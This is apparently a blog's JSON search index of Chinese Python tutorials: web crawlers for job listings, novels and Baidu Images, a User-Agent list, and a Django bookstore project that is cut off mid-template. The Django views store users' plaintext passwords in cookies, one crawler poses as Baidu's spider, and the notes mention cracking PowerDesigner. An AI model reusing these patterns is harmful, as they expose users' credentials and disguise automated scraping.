&quot;https://search.51job.com/list/010000,000000,0000,00,9,99,%25E9%2594%2580%25E5%2594%25AE,2,&#123;&#125;.html?lang=c&amp;postchannel=0000&amp;workyear=99&amp;cotype=99&amp;degreefrom=99&amp;jobterm=99&amp;companysize=99&amp;ord_field=0&amp;dibiaoid=0&amp;line=&amp;welfare=&quot;.format( i) res = request.urlopen(url).read().decode(&#x27;gbk&#x27;) # 因为数据存放在script中,json数据 使用json.loads解序列化;json.dumps序列化 rule = &#x27;__SEARCH_RESULT__ = (.*?)&lt;/script&gt;&#x27; job_dict = json.loads(re.findall(rule, res)[0]) for job in job_dict[&#x27;engine_search_result&#x27;]: if not job[&#x27;providesalary_text&#x27;]: job[&#x27;providesalary_text&#x27;] = &quot;面议&quot; print(job[&#x27;job_name&#x27;], job[&#x27;providesalary_text&#x27;])","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"User-Agent常见","slug":"User-Agent常见","date":"2020-09-26T07:47:35.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/09/26/User-Agent常见/","permalink":"http://example.com/2020/09/26/User-Agent%E5%B8%B8%E8%A7%81/","excerpt":"User-Agent常见 Chrome(谷歌) 2) Firefox(火狐) 3) Safari","text":"User-Agent常见 Chrome(谷歌) 2) Firefox(火狐) 3) Safari User-Agent常见12345678910111213141516171819201) Chrome(谷歌)Win7:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1Win10:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36Chrome 17.0 – MACMozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11 2) Firefox(火狐)Win7:Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0Firefox 4.0.1 – MACMozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 3) Safari(Safari是苹果计算机的操作系统Mac OS中的浏览器)safari 5.1 – MACMozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"Crawler --爬取笔趣阁小说","slug":"Crawler-爬取笔趣阁小说","date":"2020-09-24T07:59:27.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/24/Crawler-爬取笔趣阁小说/","permalink":"http://example.com/2020/09/24/Crawler-%E7%88%AC%E5%8F%96%E7%AC%94%E8%B6%A3%E9%98%81%E5%B0%8F%E8%AF%B4/","excerpt":"crawler–爬取小说","text":"crawler–爬取小说 Crawler –爬取笔趣阁小说123456789101112131415161718192021222324252627282930313233343536373839from lxml import etreefrom urllib import requestimport gzipurl = &quot;http://www.xbiquge.la/xiaoshuodaquan/&quot;result = request.urlopen(url).read()try: res = gzip.decompress(result).decode(&#x27;utf-8&#x27;)except: res = result.decode(&#x27;utf-8&#x27;)ele = etree.HTML(res)book_urls = ele.xpath(&#x27;//div[@id=&quot;main&quot;]//li/a/@href&#x27;)for book_url in book_urls: book_res = request.urlopen(book_url).read() try: book_result = book_res.decode(&#x27;utf-8&#x27;) except: book_result = gzip.decompress(book_res).decode(&#x27;utf-8&#x27;) ele = etree.HTML(book_result) chapter_urls = ele.xpath(&#x27;//div[@id=&quot;list&quot;]/dl/dd/a/@href&#x27;) book_name = ele.xpath(&#x27;//h1/text()&#x27;)[0] print(book_name) new_chapter_urls = [&quot;http://www.xbiquge.la&quot; + url for url in chapter_urls] print(new_chapter_urls) for chapter_url in new_chapter_urls: req = request.Request(chapter_url, headers=&#123;&#x27;user-agent&#x27;: &quot;baiduSpider&quot;&#125;) cha_res = request.urlopen(req).read() try: cha_result = cha_res.decode(&#x27;utf-8&#x27;) except: cha_result = gzip.decompress(cha_res).decode(&#x27;utf-8&#x27;) ele = etree.HTML(cha_result) content = ele.xpath(&#x27;//div[@id=&quot;content&quot;]/text()&#x27;) cha_name = ele.xpath(&#x27;//h1/text()&#x27;)[0] with open(book_name + &quot;.txt&quot;, &quot;a&quot;, encoding=&quot;utf-8&quot;) as w: w.write(cha_name + &quot;\\n&quot;) for cont in content: w.write(cont) w.write(&quot;\\n&quot;)","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"Crawler --爬虫初窥门径","slug":"Crawler-爬虫初窥门径","date":"2020-09-24T01:18:10.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/24/Crawler-爬虫初窥门径/","permalink":"http://example.com/2020/09/24/Crawler-%E7%88%AC%E8%99%AB%E5%88%9D%E7%AA%A5%E9%97%A8%E5%BE%84/","excerpt":"crawler 简单的爬取百度图片,并保存图片","text":"crawler 简单的爬取百度图片,并保存图片 Crawler 爬虫——爬取百度图片123456789101112131415161718192021222324252627282930import urllibfrom urllib import request, parseimport re# keyword = &quot;阿狸&quot;# keyword = urllib.parse.quote(keyword)# print(keyword) #%E9%98%BF%E7%8B%B8url = &quot;https://image.baidu.com/search/index?tn=baiduimage&amp;ipn=r&amp;ct=201326592&amp;cl=2&amp;lm=-1&amp;st=-1&amp;fm=result&amp;fr=&amp;sf=1&amp;fmq=1600852001400_R&amp;pv=&amp;ic=0&amp;nc=1&amp;z=&amp;hd=&amp;latest=&amp;copyright=&amp;se=1&amp;showtab=0&amp;fb=0&amp;width=&amp;height=&amp;face=0&amp;istype=2&amp;ie=utf-8&amp;sid=&amp;word=%E9%98%BF%E7%8B%B8&quot;result = request.urlopen(url=url).read().decode(&#x27;utf-8&#x27;)# print(result)# 写入html# with open(&quot;picture.html&quot;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as w:# w.write(result)#正则匹配规则,列表存储符合的图片链接rule = &#x27;&quot;thumbURL&quot;:&quot;(.*?)&quot;&#x27;pic_list = re.findall(rule, result)#遍历列表,然后保存图片a = 1for i in pic_list: print(i) res = request.urlopen(i).read() string = str(a) + &#x27;.jpg&#x27; a = int(a)+1 with open(string, &#x27;wb&#x27;) as w: w.write(res)","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"Crawler --爬虫爬取百度图片","slug":"Crawler-爬虫爬取百度图片","date":"2020-09-24T01:18:10.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/24/Crawler-爬虫爬取百度图片/","permalink":"http://example.com/2020/09/24/Crawler-%E7%88%AC%E8%99%AB%E7%88%AC%E5%8F%96%E7%99%BE%E5%BA%A6%E5%9B%BE%E7%89%87/","excerpt":"crawler 简单的爬取百度图片,并保存图片 正则匹配爬虫,json格式处理爬取百度图片 使用urlretrieve直接保存图片","text":"crawler 简单的爬取百度图片,并保存图片 正则匹配爬虫,json格式处理爬取百度图片 使用urlretrieve直接保存图片 Crawler 爬虫——爬取百度图片简单的爬取网页图片 12345678910111213141516171819202122232425262728import urllibfrom urllib import request, parseimport re# keyword = &quot;阿狸&quot;# keyword = urllib.parse.quote(keyword)# print(keyword) #%E9%98%BF%E7%8B%B8url = &quot;https://image.baidu.com/search/index?tn=baiduimage&amp;ipn=r&amp;ct=201326592&amp;cl=2&amp;lm=-1&amp;st=-1&amp;fm=result&amp;fr=&amp;sf=1&amp;fmq=1600852001400_R&amp;pv=&amp;ic=0&amp;nc=1&amp;z=&amp;hd=&amp;latest=&amp;copyright=&amp;se=1&amp;showtab=0&amp;fb=0&amp;width=&amp;height=&amp;face=0&amp;istype=2&amp;ie=utf-8&amp;sid=&amp;word=%E9%98%BF%E7%8B%B8&quot;result = request.urlopen(url=url).read().decode(&#x27;utf-8&#x27;)# print(result)# 写入html# with open(&quot;picture.html&quot;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as w:# w.write(result)#正则匹配规则,列表存储符合的图片链接rule = &#x27;&quot;thumbURL&quot;:&quot;(.*?)&quot;&#x27;pic_list = re.findall(rule, result)#遍历列表,然后保存图片a = 1for i in pic_list: print(i) res = request.urlopen(i).read() string = str(a) + &#x27;.jpg&#x27; a = int(a)+1 with open(string, &#x27;wb&#x27;) as w: w.write(res) 正则匹配爬虫百度图片搜索使用了ajax请求,所以找到Ajax请求的规律,就可以循环请求下载图片 123456789101112131415from urllib import requestimport rea = 1for pn in range(0, 180, 30): url = &quot;https://image.baidu.com/search/acjson?tn=resultjson_com&amp;logid=6804522630827236065&amp;ipn=rj&amp;ct=201326592&amp;is=&amp;fp=result&amp;queryWord=%E9%98%BF%E7%8B%B8&amp;cl=2&amp;lm=-1&amp;ie=utf-8&amp;oe=utf-8&amp;adpicid=&amp;st=-1&amp;z=&amp;ic=0&amp;hd=&amp;latest=&amp;copyright=&amp;word=%E9%98%BF%E7%8B%B8&amp;s=&amp;se=&amp;tab=&amp;width=&amp;height=&amp;face=0&amp;istype=2&amp;qc=&amp;nc=1&amp;fr=&amp;expermode=&amp;force=&amp;pn=&#123;&#125;&amp;rn=30&quot;.format(pn) result = request.urlopen(url).read().decode(&#x27;utf-8&#x27;) rule = &#x27;middleURL&quot;:&quot;(.*?)&quot;&#x27; pic_list = re.findall(rule, result) for i in pic_list: print(i) res = request.urlopen(i).read() with open(&quot;./img/&quot;+str(a) + &quot;.jpg&quot;, &#x27;wb&#x27;) as w: w.write(res) a += 1 json格式处理爬取百度图片 123456789101112131415161718# json格式处理from urllib import requestimport jsona = 1for pn in range(0, 180, 30): url = &quot;https://image.baidu.com/search/acjson?tn=resultjson_com&amp;logid=6804522630827236065&amp;ipn=rj&amp;ct=201326592&amp;is=&amp;fp=result&amp;queryWord=%E9%98%BF%E7%8B%B8&amp;cl=2&amp;lm=-1&amp;ie=utf-8&amp;oe=utf-8&amp;adpicid=&amp;st=-1&amp;z=&amp;ic=0&amp;hd=&amp;latest=&amp;copyright=&amp;word=%E9%98%BF%E7%8B%B8&amp;s=&amp;se=&amp;tab=&amp;width=&amp;height=&amp;face=0&amp;istype=2&amp;qc=&amp;nc=1&amp;fr=&amp;expermode=&amp;force=&amp;pn=&#123;&#125;&amp;rn=30&quot;.format( pn) result = request.urlopen(url).read().decode(&#x27;utf-8&#x27;) #生成字符串 new_result = json.loads(result) print(new_result) for data in new_result[&#x27;data&#x27;]: img_url = data[&#x27;middleURL&#x27;] print(img_url) img_res = request.urlopen(img_url).read() with open(&quot;./img/&quot; + str(a) + &quot;.jpg&quot;, &#x27;wb&#x27;) as w: w.write(img_res) a += 1 使用urlretrieve直接保存图片123456789101112131415# _*_coding:UTF-8 _*_from urllib import requestimport jsonnum = 1for page in range(0, 120, 30): url = &quot;https://image.baidu.com/search/acjson?tn=resultjson_com&amp;logid=6804522630827236065&amp;ipn=rj&amp;ct=201326592&amp;is=&amp;fp=result&amp;queryWord=%E9%98%BF%E7%8B%B8&amp;cl=2&amp;lm=-1&amp;ie=utf-8&amp;oe=utf-8&amp;adpicid=&amp;st=-1&amp;z=&amp;ic=0&amp;hd=&amp;latest=&amp;copyright=&amp;word=%E9%98%BF%E7%8B%B8&amp;s=&amp;se=&amp;tab=&amp;width=&amp;height=&amp;face=0&amp;istype=2&amp;qc=&amp;nc=1&amp;fr=&amp;expermode=&amp;force=&amp;pn=&#123;&#125;&amp;rn=30&quot;.format( page) res = request.urlopen(url).read().decode(&quot;utf-8&quot;) for data in json.loads(res)[&#x27;data&#x27;]: if data: img_url = data[&#x27;thumbURL&#x27;] # 保存 request.urlretrieve(img_url, filename=&quot;./img/&quot; + str(num) + &quot;.jpg&quot;) num += 1","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"Pycharm--当当网项目","slug":"Pycharm-当当网项目","date":"2020-09-22T01:02:37.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/09/22/Pycharm-当当网项目/","permalink":"http://example.com/2020/09/22/Pycharm-%E5%BD%93%E5%BD%93%E7%BD%91%E9%A1%B9%E7%9B%AE/","excerpt":"PyCharm–当当网项目的实现,实现注册登陆,图书分类,详情展示,购物车,订单等功能","text":"PyCharm–当当网项目的实现,实现注册登陆,图书分类,详情展示,购物车,订单等功能 PyCharm–当当网项目的实现一.项目的开发流程(1) 需求分析1明确项目需要实现的功能,不用关心具体实现 (2)库表设计12345表先行涉及的数据有哪些表之间的联系表内需要的字段专用工具实现 (3)详细设计1每一块的功能实现,具体怎么做 (4)编码(5)测试123测试人员测试项目,提交测试文档-bug,bug日清黑白盒测试写测试代码 (6)环境部署1购买云服务器,开发人员或运维做环境部署 (7)项目上线运行(8)运维&#x2F;运营二.库表设计123456781. 安装PowerDesigner并破解2. 找当当网的实体表，表中的字段，表与表之间的联系3. 使用PowerDesigner设计出当当的库表的模型4. 使用PD导出数据库表.sql文件，再导入到Navicat中 - 如果导入失败/出错，检查.sql文件，找到错误，修改PD中的物理模型，再重新导出.sql文件5. 使用Pycharm建好当当网的项目，分好模块，建好app，再生成model类 python manage.py inspectdb 预览model类 python manage.py inspectdb &gt; app名/models.py 三.添加数据,完成图书分类展示模块化设计index模块12345678910111213141516171819# Create your views here.def index(request): time = datetime.now().date() - timedelta(days=3650) # 获取当前时间的上一个时间 cate1 = TCategory.objects.filter(level=1) # 一级标签 cate2 = TCategory.objects.filter(level=2) # 二级标签 booklist1 = TBook.objects.order_by(&quot;-publish_time&quot;)[:10] # 根据上架时间排名 booklist2 = TBook.objects.filter(publish_time__gte=time).order_by(&quot;-sales&quot;) # 根据最新上架时间,销售排名 # 通过cookice判断是否免登陆状态 user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) user_pwd = request.COOKIES.get(&#x27;txtPassword&#x27;) res = TUser.objects.filter(user_name=user_name, user_pwd=user_pwd) if res: return render(request, &#x27;index/index.html&#x27;, &#123;&quot;user_name&quot;: user_name, &quot;cates1&quot;: cate1, &quot;cates2&quot;: cate2, &quot;booklist1&quot;: booklist1, &quot;booklist2&quot;: booklist2, &#125;) return render(request, &#x27;index/index.html&#x27;, &#123;&quot;cates1&quot;: cate1, &quot;cates2&quot;: cate2, &quot;booklist1&quot;: booklist1, &quot;booklist2&quot;: booklist2&#125;) index.html1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;ul class=&quot;slides_container clearfix&quot;&gt; &lt;li &gt; &#123;% for book in booklist1 %&#125; &#123;% if forloop.counter0 &lt; 8 %&#125; &lt;dl class=&quot;clearfix&quot;&gt; &lt;dt&gt;&lt;a class=&quot;img&quot; href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; book.id &#125;&#125;&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/static/book_pic/&#123;&#123; book.picture &#125;&#125;&quot; alt=&quot;&quot;&gt;&lt;/a&gt;&lt;/dt&gt; &lt;dd&gt; &lt;p class=&quot;name&quot; &gt;&lt;a title=&quot;&quot; href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; book.id &#125;&#125;&quot; target=&quot;_blank&quot; style=&quot; &quot;&gt;&#123;&#123; book.book_name &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;p class=&quot;author&quot;&gt;&lt;span class=&quot;author_t&quot;&gt;&lt;/span&gt;&#123;&#123; book.author &#125;&#125; 著&lt;/p&gt; &lt;p class=&quot;price&quot;&gt;&lt;span class=&quot;rob&quot;&gt;&lt;span class=&quot;sign&quot;&gt;￥&lt;/span&gt;&lt;span class=&quot;num&quot;&gt;&#123;&#123; book.new_price &#125;&#125;&lt;/span&gt;&lt;span class=&quot;tail&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;price_r&quot;&gt;&lt;span class=&quot;sign&quot;&gt;￥&lt;/span&gt;&lt;span class=&quot;num&quot;&gt;&#123;&#123; book.old_price &#125;&#125;&lt;/span&gt;&lt;span class=&quot;tail&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt; &lt;span style=&quot;background: url(http://img4.ddimg.cn/00035/pic/xsq.png) no-repeat 0px 0px; _background-image: none; _filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src=&#x27;http://img4.ddimg.cn/00035/pic/xsq.png&#x27;,sizingMethod=&#x27;noscale&#x27;);&quot; class=&quot;product_tags&quot;&gt;&lt;/span&gt;&lt;/dd&gt; &lt;/dl&gt;&#123;% endif %&#125;&#123;% endfor %&#125;&lt;/li&gt;&lt;/ul&gt;&lt;div id=&quot;con_two_1&quot; style=&quot;display:block;&quot; &gt; &lt;ul class=&quot;list01&quot;&gt; &#123;% for book in booklist2 %&#125; &#123;% if forloop.counter &lt; 6 %&#125; &#123;% if forloop.counter == 1 %&#125; &lt;li class=&quot;active&quot;&gt; &lt;span class=&quot;num num1&quot;&gt;&#123;&#123; forloop.counter &#125;&#125;&lt;/span&gt; &#123;% elif forloop.counter &lt;= 3 %&#125; &lt;li &gt;&lt;span class=&quot;num num1&quot;&gt;&#123;&#123; forloop.counter &#125;&#125;&lt;/span&gt; &#123;% else %&#125; &lt;li &gt;&lt;span class=&quot;num&quot;&gt;&#123;&#123; forloop.counter &#125;&#125;&lt;/span&gt; &#123;% endif %&#125; &lt;div&gt; &lt;a class=&quot;list_name&quot; href=&quot;&quot;&gt;&#123;&#123; book.book_name &#125;&#125;&lt;/a&gt; &lt;dl class=&quot;list_con clearfix&quot;&gt; &lt;dt&gt;&lt;a href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; book.id &#125;&#125;&quot;&gt;&lt;img src=&quot;/static/book_pic/&#123;&#123; book.picture &#125;&#125;&quot;&gt;&lt;/a&gt;&lt;/dt&gt; &lt;dd&gt; &lt;p class=&quot;name&quot;&gt;&lt;a href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; book.id &#125;&#125;&quot;&gt;&#123;&#123; book.author &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;b&gt;￥&#123;&#123; book.new_price &#125;&#125;&lt;/b&gt;&lt;em&gt;￥&#123;&#123; book.old_price &#125;&#125;&lt;/em&gt;&lt;a class=&quot;pl&quot; href=&quot;#&quot;&gt;销售量&#123;&#123; book.sales &#125;&#125;&lt;/a&gt;&lt;/dd&gt; &lt;/dl&gt; &lt;/div&gt; &#123;% endif %&#125; &#123;% endfor %&#125; &lt;/ul&gt;&lt;/div&gt;&lt;div id=&quot;con_four_1&quot;&gt; &lt;ul class=&quot;list01&quot;&gt; &#123;% for book in booklist2 %&#125; &#123;% if forloop.counter &lt; 11 %&#125; &#123;% if forloop.counter == 1 %&#125; &lt;li class=&quot;active&quot;&gt; &lt;span class=&quot;num num1&quot;&gt;&#123;&#123; forloop.counter &#125;&#125;&lt;/span&gt; &#123;% elif forloop.counter &lt;= 3 %&#125; &lt;li &gt;&lt;span class=&quot;num num1&quot;&gt;&#123;&#123; forloop.counter &#125;&#125;&lt;/span&gt; &#123;% else %&#125; &lt;li &gt;&lt;span class=&quot;num&quot;&gt;&#123;&#123; forloop.counter &#125;&#125;&lt;/span&gt; &#123;% endif %&#125; &lt;div&gt; &lt;a class=&quot;list_name&quot; href=&quot;&quot;&gt;&#123;&#123; book.book_name &#125;&#125;&lt;/a&gt; &lt;dl class=&quot;list_con clearfix&quot;&gt; &lt;dt&gt;&lt;a href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; book.id &#125;&#125;&quot;&gt;&lt;img src=&quot;/static/book_pic/&#123;&#123; book.picture &#125;&#125;&quot;&gt;&lt;/a&gt;&lt;/dt&gt; &lt;dd&gt; &lt;p class=&quot;name&quot;&gt;&lt;a href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; book.id &#125;&#125;&quot;&gt;&#123;&#123; book.author &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;b&gt;￥&#123;&#123; book.new_price &#125;&#125;&lt;/b&gt;&lt;em&gt;￥&#123;&#123; book.old_price &#125;&#125;&lt;/em&gt;&lt;a class=&quot;pl&quot; href=&quot;#&quot;&gt;销售量&#123;&#123; book.sales &#125;&#125;&lt;/a&gt;&lt;/dd&gt; &lt;/dl&gt; &lt;/div&gt; &lt;/li&gt; &#123;% endif %&#125; &#123;% endfor %&#125; &lt;/ul&gt;&lt;/div&gt; 四.图书的详情和图书列表book模块123456789101112131415161718192021222324252627282930313233343536373839def booklist(request): cate1 = request.GET.get(&quot;cate1&quot;) # 获取一级标签的id cate2 = request.GET.get(&quot;cate2&quot;) # 获取二级标签的id cates1 = TCategory.objects.filter(level=1) # 一级标签 cates2 = TCategory.objects.filter(level=2) # 二级标签 # #根据标签id获取其model对象 # title1 = TCategory.objects.filter(pk=cate1) # title2 = TCategory.objects.filter(pk=cate2)[0] # print(title2.category_id,6545645645646) if cate1 and cate1 != &#x27;None&#x27;: # 获取到属于一级标题下二级标题的所有书籍 paginator = Paginator(TBook.objects.filter(category__parent_id=cate1), per_page=3) else: paginator = Paginator(TBook.objects.filter(category_id=cate2), per_page=3) # 实现分页 num = request.GET.get(&quot;num&quot;, 1) page = paginator.page(num) # 通过cookice判断是否免登陆状态 user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) user_pwd = request.COOKIES.get(&#x27;txtPassword&#x27;) res = TUser.objects.filter(user_name=user_name, user_pwd=user_pwd) if res: return render(request, &#x27;book/booklist.html&#x27;, &#123;&quot;user_name&quot;:user_name,&quot;cates1&quot;: cates1, &quot;cates2&quot;: cates2,&quot;page&quot;: page,&quot;cate1&quot;:cate1,&quot;cate2&quot;:cate2&#125;) return render(request, &#x27;book/booklist.html&#x27;, &#123;&quot;cates1&quot;: cates1, &quot;cates2&quot;: cates2,&quot;page&quot;: page,&quot;cate1&quot;:cate1,&quot;cate2&quot;:cate2&#125;)def bookdetails(request): id = request.GET.get(&quot;id&quot;) # 获取前端返回的图书id book = TBook.objects.filter(pk=id)[0] # 根据id查询到书的信息 # discount 折扣计算返回给前端 discount = round((book.new_price / book.old_price * 10), 2) # 通过cookice判断是否免登陆状态 user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) user_pwd = request.COOKIES.get(&#x27;txtPassword&#x27;) res = TUser.objects.filter(user_name=user_name, user_pwd=user_pwd) if res: return render(request, &#x27;book/bookdetails.html&#x27;, &#123;&quot;user_name&quot;:user_name,&quot;book&quot;: book, &quot;discount&quot;: discount&#125;) return render(request, &#x27;book/bookdetails.html&#x27;, &#123;&quot;book&quot;: book, &quot;discount&quot;: discount&#125;) booklist.html123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899&lt;div class=&quot;con flq_body&quot; &gt; &#123;% for cate1 in cates1 %&#125; &lt;div class=&quot;level_one&quot; &gt; &lt;dl class=&quot;con primary_dl&quot; &gt; &lt;dt class=&quot;con &quot; name=&quot;m403752_pid5367_t10276&quot;&gt;&lt;a href=&quot;&#123;% url &#x27;book:booklist&#x27; %&#125;?cate1=&#123;&#123; cate1.id &#125;&#125;&quot;&gt;&lt;span&gt;&#123;&#123; cate1.category_id &#125;&#125;&lt;/span&gt;&lt;/a&gt;&lt;/dt&gt; &lt;dd class=&quot;con sec_cate dd_level1&quot; &gt; &#123;% for cate2 in cates2 %&#125; &#123;% if cate2.parent_id == cate1.id %&#125; &lt;a href=&quot;&#123;% url &#x27;book:booklist&#x27; %&#125;?cate2=&#123;&#123; cate2.id &#125;&#125;&quot; target=&quot;_blank&quot; title=&quot;&#123;&#123; cate2.category_id &#125;&#125;&quot; class=&quot;title1&quot; &gt; &#123;&#123; cate2.category_id &#125;&#125; &lt;/a&gt; &#123;% endif %&#125; &#123;% endfor %&#125; &lt;/dd&gt; &lt;/dl&gt; &lt;/div&gt; &#123;% endfor %&#125;&lt;/div&gt;&lt;div class=&quot;data&quot; name=&quot;Fy&quot;&gt;共&lt;span&gt;&#123;&#123; page.paginator.count &#125;&#125;&lt;/span&gt;个商品 &#123;% if page.has_previous %&#125; &lt;a href=&quot;&#123;% url &#x27;book:booklist&#x27; %&#125;?num=&#123;&#123; page.previous_page_number &#125;&#125;&amp;cate1=&#123;&#123; cate1 &#125;&#125;&amp;cate2=&#123;&#123; cate2 &#125;&#125;&quot; class=&quot;arrow_l arrow_l_on&quot;&gt;&lt;/a&gt; &#123;% else %&#125; &lt;a class=&quot;arrow_l &quot;&gt;&lt;/a&gt; &#123;% endif %&#125; &lt;span class=&quot;or&quot;&gt;&#123;&#123; page.number &#125;&#125;&lt;/span&gt; &lt;span&gt;/&#123;&#123; page.paginator.num_pages &#125;&#125;&lt;/span&gt; &#123;% if page.has_next %&#125; &lt;a href=&quot;&#123;% url &#x27;book:booklist&#x27; %&#125;?num=&#123;&#123; page.next_page_number &#125;&#125;&amp;cate1=&#123;&#123; cate1 &#125;&#125;&amp;cate2=&#123;&#123; cate2 &#125;&#125;&quot; class=&quot;arrow_r arrow_r_on&quot;&gt;&lt;/a&gt; &#123;% else %&#125; &lt;a class=&quot;arrow_r &quot; &gt;&lt;/a&gt; &#123;% endif %&#125;&lt;/div&gt;&#123;% for book in page.object_list %&#125;&lt;li class=&quot;line1&quot; id=&quot;23668351&quot;&gt; &lt;div class=&quot;inner&quot;&gt; &lt;a title=&quot; &#123;&#123; book.book_name &#125;&#125; &quot; class=&quot;pic&quot; href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; book.id &#125;&#125;&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/static/book_pic/&#123;&#123; book.picture &#125;&#125;&quot; alt=&quot; &#123;&#123; book.book_name &#125;&#125; &quot;&gt;&lt;/a&gt; &lt;p class=&quot;name&quot;&gt;&lt;a title=&quot; &#123;&#123; book.book_name &#125;&#125; &quot; href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; book.id &#125;&#125;&quot; target=&quot;_blank&quot;&gt; &#123;&#123; book.book_name &#125;&#125; &lt;/a&gt;&lt;/p&gt; &lt;p class=&quot;star&quot;&gt;&lt;span class=&quot;level&quot;&gt;&lt;span style=&quot;width: 100%;&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;a href=&quot;#&quot; target=&quot;_blank&quot; name=&quot;P_pl&quot;&gt;&#123;&#123; book.sales &#125;&#125;销售量&lt;/a&gt;&lt;/p&gt; &lt;div class=&quot;publisher_info&quot;&gt; &lt;p class=&quot;author&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;a href=&quot;#&quot; name=&quot;P_zz&quot; title=&quot;&#123;&#123; book.author &#125;&#125;&quot;&gt;&#123;&#123; book.author &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;p class=&quot;publishing_time&quot;&gt;&lt;span&gt;&lt;/span&gt;/ &#123;&#123; book.publish_time &#125;&#125; &lt;/p&gt; &lt;p class=&quot;publishing&quot;&gt;&lt;span&gt;&lt;/span&gt;/ &lt;a href=&quot;#&quot; name=&quot;P_cbs&quot; title=&quot;&#123;&#123; book.publish &#125;&#125;&quot;&gt;&#123;&#123; book.publish &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;/div&gt; &lt;p class=&quot;detail&quot;&gt; &#123;&#123; book.content_introduction &#125;&#125; &lt;p class=&quot;dang&quot; style=&quot;display: block;&quot;&gt;当当自营&lt;/p&gt; &lt;p class=&quot;buy_button&quot;&gt;&lt;a class=&quot;listbtn_info&quot; name=&quot;area_buy&quot; dd_name=&quot;查看详情&quot; href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; book.id &#125;&#125;&quot; &gt;查看详情&lt;/a&gt;&lt;/p&gt; &lt;p class=&quot;price&quot;&gt; &lt;span class=&quot;price_n&quot;&gt;￥&#123;&#123; book.new_price &#125;&#125;&lt;/span&gt;&lt;a style=&quot;color: #878787;text-decoration:none;&quot;&gt;定价：&lt;/a&gt;&lt;span class=&quot;price_r&quot;&gt;￥&#123;&#123; book.old_price &#125;&#125;&lt;/span&gt;(&lt;span class=&quot;price_s&quot;&gt;&#123;&#123; book.discount &#125;&#125;折&lt;/span&gt;)&lt;/p&gt; &lt;div class=&quot;ebook_buy&quot;&gt; &lt;p class=&quot;buy_button&quot;&gt; &lt;a class=&quot;listbtn_buy&quot; id=&quot;A13&quot; id1=&quot;&#123;&#123; book.id &#125;&#125;&quot; dd_name=&quot;加入购物车&quot; href=&quot;javascript:void (0);&quot; class=&quot;buy_book&quot; name=&quot;Buy&quot;&gt;&lt;/a&gt;&lt;/p&gt; &lt;/div&gt; &lt;/div&gt;&lt;/li&gt;&#123;% endfor %&#125;&lt;ul class=&quot;paging&quot; name=&quot;Fy&quot;&gt; &lt;li class=&quot;next&quot;&gt; &#123;% if page.has_previous %&#125; &lt;a href=&quot;&#123;% url &#x27;book:booklist&#x27; %&#125;?num=&#123;&#123; page.previous_page_number &#125;&#125;&amp;cate1=&#123;&#123; cate1 &#125;&#125;&amp;cate2=&#123;&#123; cate2 &#125;&#125;&quot;&gt; 上一页&lt;/a&gt; &#123;% endif %&#125;&lt;/li&gt; &#123;% for foo in page.paginator.page_range %&#125; &#123;% if foo == page.number %&#125; &lt;li&gt;&lt;a href=&quot;&#123;% url &#x27;book:booklist&#x27; %&#125;?num=&#123;&#123; foo 